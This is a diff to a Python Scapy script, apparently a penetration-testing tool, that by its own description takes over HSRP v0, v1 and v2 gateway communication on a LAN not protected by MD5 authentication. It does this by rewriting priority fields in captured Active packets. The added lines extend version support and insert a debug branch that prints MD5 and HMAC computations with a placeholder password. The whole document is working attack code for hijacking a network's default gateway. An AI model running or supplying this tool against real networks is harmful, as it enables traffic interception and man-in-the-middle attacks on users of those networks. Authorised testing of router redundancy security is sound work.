@@ -1,15 +1,21 @@
 #!/usr/bin/env python
 
 # $Id: 20121212$
-# $Date: 2012-12-12 10:23:20$
+# $Date: 2012-12-12 11:27:12$
 # $Author: Marek Lukaszuk$
 
-# This takes over any HSRP communication in LAN
-# that is _not_ protected by MD5 auth
+# This takes over any HSRPv0/1 and v2 
+# communication in LAN that 
+# is _not_ protected by MD5 auth
+
+# http://www.networksorcery.com/enp/protocol/hsrp.htm
+# http://www.cisco.com/en/US/docs/ios/12_3t/12_3t2/feature/guide/gthsrpau.html
 
 from scapy.all import *
 import time
 import sys
+import hashlib
+from Crypto.Hash import HMAC
 
 # tweak variables
 IPv4Src = "10.0.0.10"
@@ -49,7 +55,7 @@ hsrpv2active = "\x06"
 # this function checks if the HSRP packet is an Active packet
 def hsrpactive(pkt):
   if pkt.haslayer(HSRP):
-    if pkt[HSRP].state == 16: # HSRPv1
+    if pkt[HSRP].state == 16: # HSRPv0/1
       return True
     if str(pkt[HSRP])[2] == hsrpv2 and str(pkt[HSRP])[4] == hsrpv2active: # HSRPv2
       return True
@@ -83,6 +89,7 @@ if str(p[HSRP])[2] == hsrpv2 and str(p[HSRP])[4] == hsrpv2active:
   data = str(p[HSRP])
   # print data.encode('hex')
 
+  org = data[:]
   off = 0
   while True:
 
@@ -91,6 +98,17 @@ if str(p[HSRP])[2] == hsrpv2 and str(p[HSRP])[4] == hsrpv2active:
 
     if data[off] == "\x01": # HSRPv2 TLV for group
       data = data[:off+16]+chr(HSRPpri)+data[off+17:]
+
+    if data[off] == "\x04":
+      print "[-] auth HSRP using MD5, stopping"
+      print org.encode('hex')
+      print org[:-16].encode('hex') 
+      print org[-16:].encode('hex')
+      d1 = org[:-16]+"\x00"*16
+      print hashlib.md5(org[:-16]+"\x00"*12+"pass").hexdigest()
+      print d1.encode('hex')
+      print HMAC.new("pass",d1).hexdigest()
+      sys.exit(1)
 
     off += ord(data[off+1]) + 2
  
